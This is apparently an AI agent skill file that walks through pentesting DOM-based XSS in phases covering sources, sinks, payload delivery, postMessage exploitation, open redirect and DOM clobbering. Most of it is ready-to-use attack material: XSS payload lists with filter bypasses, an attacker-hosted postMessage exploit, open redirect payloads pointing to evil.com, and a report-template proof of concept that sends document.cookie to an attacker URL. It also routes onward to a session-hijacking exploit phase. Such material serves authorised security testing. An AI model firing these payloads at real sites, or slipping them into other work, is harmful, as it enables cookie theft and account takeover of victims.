---
name: vuln-dom-xss
description: "DOM-based XSS and client-side vulnerabilities. Source-to-sink analysis, postMessage origin bypass, open redirect via DOM, eval/innerHTML sinks, DOM clobbering. Triggers: 'dom xss', 'dom-based xss', 'client-side xss', 'innerHTML injection', 'postmessage xss', 'javascript xss', 'dom clobbering', 'open redirect dom', 'client side vulnerability', 'sink source analysis'."
---

# DOM-Based Vulnerabilities

Client-side JavaScript processes attacker-controlled data without validation → XSS, open redirect, client-side injection.

---

## Phase 1: Source Identification

```javascript
// Common sources (attacker-controlled inputs):
location.hash
location.search           // ?param=
location.href
document.referrer
window.name
document.cookie
localStorage / sessionStorage
window.postMessage        // cross-origin messages

// Test each by injecting marker:
// Load: https://target.com/page#<marker>
// Load: https://target.com/page?param=<marker>
```

```bash
# Map all sources with Burp/browser DevTools:
# 1. Open DevTools → Sources → add breakpoint on sink functions
# 2. Load page with ?param=DOMXSS_TEST in URL
# 3. Check if DOMXSS_TEST appears in DOM

# Automated: DOMXSSscanner or dalfox
dalfox url "https://TARGET/?param=FUZZ" --deep-domxss
```

---

## Phase 2: Sink Discovery

```javascript
// Dangerous sinks to audit:

// HTML injection sinks:
element.innerHTML = userInput     // ← critical
element.outerHTML = userInput
document.write(userInput)
document.writeln(userInput)
$(element).html(userInput)        // jQuery

// Code execution sinks:
eval(userInput)
Function(userInput)
setTimeout(userInput)             // string arg form
setInterval(userInput)
new Function(userInput)

// Navigation sinks (open redirect):
location.href = userInput
location.replace(userInput)
location.assign(userInput)
window.open(userInput)

// jQuery sinks:
$.parseHTML(userInput)
$(userInput)                      // $(location.hash) pattern
$('#' + userInput)

// Script src injection:
scriptElement.src = userInput
```

---

## Phase 3: Payload Delivery

```bash
TARGET="https://TARGET"

# Test innerHTML sink via URL fragment:
"$TARGET/page#<img src=x onerror=alert(1)>"
"$TARGET/page#<svg onload=alert(1)>"
"$TARGET/page#<script>alert(1)</script>"   # needs DOM to eval

# Test via URL parameter:
"$TARGET/page?param=<img src=x onerror=alert(1)>"
"$TARGET/page?q=\"><img src=x onerror=alert(document.cookie)>"

# Bypass common filters:
# No angle brackets:
"javascript:alert(1)"                          # href/location sink
"data:text/html,<script>alert(1)</script>"     # if data: allowed

# No quotes:
# Use event handlers with backticks or unquoted:
"<img src=x onerror=alert`1`>"

# Encoded:
"<img src=x onerror=alert(1)>"           # unicode in attribute
```

---

## Phase 4: postMessage Exploitation

```javascript
// Find postMessage listeners:
// Grep source for addEventListener('message', ...)
// Look for: window.addEventListener('message', function(e) { ... })

// Vulnerable pattern — no origin check:
window.addEventListener('message', function(e) {
    document.getElementById('output').innerHTML = e.data;  // sink!
});

// Exploit: send malicious postMessage from attacker page:
// Host this on attacker domain:
window.onload = function() {
    var target = window.open('https://TARGET/page', '_blank');
    setTimeout(function() {
        target.postMessage('<img src=x onerror=alert(document.domain)>', '*');
    }, 2000);
};

// Check if origin validated (look for):
if (e.origin !== 'https://trusted.com') return;  // safe
if (e.origin.includes('trusted.com')) return;     // BYPASSABLE via: eviltrusted.com
```

---

## Phase 5: Open Redirect via DOM

```javascript
// Find redirect sinks:
// location.href, location.replace(), window.open()
// Triggered by URL parameters like ?redirect=, ?url=, ?next=, ?return=

// Test payloads:
"https://TARGET/login?redirect=https://evil.com"
"https://TARGET/login?redirect=//evil.com"         // protocol-relative
"https://TARGET/login?redirect=javascript:alert(1)"
"https://TARGET/login?redirect=%2F%2Fevil.com"     // URL-encoded //
"https://TARGET/login?redirect=https:evil.com@target.com"  // confusion

// From hash fragment:
"https://TARGET/page#https://evil.com"
"https://TARGET/page#javascript:location='https://evil.com'"

// Check allowlist bypass:
"https://TARGET/login?redirect=https://target.com.evil.com"  // suffix match
"https://TARGET/login?redirect=https://evil.com?target.com"  // param confused
```

---

## Phase 6: DOM Clobbering

```javascript
// DOM clobbering: attacker-controlled HTML overwrites JS variables
// Works when app does: document.getElementById('config') or window.config

// Vulnerable code:
var config = document.getElementById('config').getAttribute('src');
// → Can inject: <a id=config href=javascript:alert(1)>

// Clobber with HTML injection:
<form id=x><input id=y value=CLOBBERED></form>
// → document.x.y → HTMLInputElement with value "CLOBBERED"

// Multi-level clobbering:
<a id=config><a id=config name=endpoint href=//evil.com></a></a>
// → window.config → HTMLCollection; config.endpoint → "//evil.com"

// Targets to look for in JS:
// window.x, document.y, globalThis.z
// DOM properties used without null check
```

---

## Phase 7: Automated Scanning

```bash
# DOMXSSHunter-style detection:
# Configure interactsh callback for DOM XSS:
CALLBACK="xxx.oast.fun"

# Inject OOB payload in all URL parameters:
dalfox url "$TARGET" --blind "https://$CALLBACK/domxss" --deep-domxss

# Static analysis — grep for sink patterns:
# Download JS from target:
wget -q -r -nd -np -A.js "$TARGET" -P ./js_files/

# Search for dangerous patterns:
grep -rn "innerHTML\s*=" ./js_files/
grep -rn "document\.write\s*(" ./js_files/
grep -rn "location\.href\s*=" ./js_files/
grep -rn "eval\s*(" ./js_files/
grep -rn "location\.hash" ./js_files/
grep -rn "\.search\b" ./js_files/      # location.search

# Find postMessage listeners:
grep -rn "addEventListener.*message" ./js_files/
grep -rn "postMessage" ./js_files/
```

---

## Phase 8: Report Template

```markdown
## Vulnerability: DOM-Based XSS

**Severity:** High
**URL:** `https://TARGET/page#PAYLOAD`
**Source:** `location.hash`
**Sink:** `element.innerHTML`

### Proof of Concept
```
https://TARGET/page#<img src=x onerror="document.location='https://evil.com/?c='+document.cookie">
```

### Impact
Cookie theft, session hijacking, user action on behalf of victim.

### Remediation
- Replace `innerHTML` with `textContent` for untrusted data
- Sanitize via DOMPurify before any HTML insertion
- Validate `postMessage` event origin strictly
- Never pass `location.*` directly to navigation sinks without allowlist
```

---

## Output

Save to `.omop/engagement/vuln/dom-xss/`:
- `sources-sinks.txt` — identified vulnerable source-to-sink chains
- `payloads-tested.txt` — payloads and results
- `poc-urls.txt` — working PoC URLs

## Next Phase

→ `pentest-exploit` for session hijacking/account takeover via XSS
→ `pentest-report` for final report
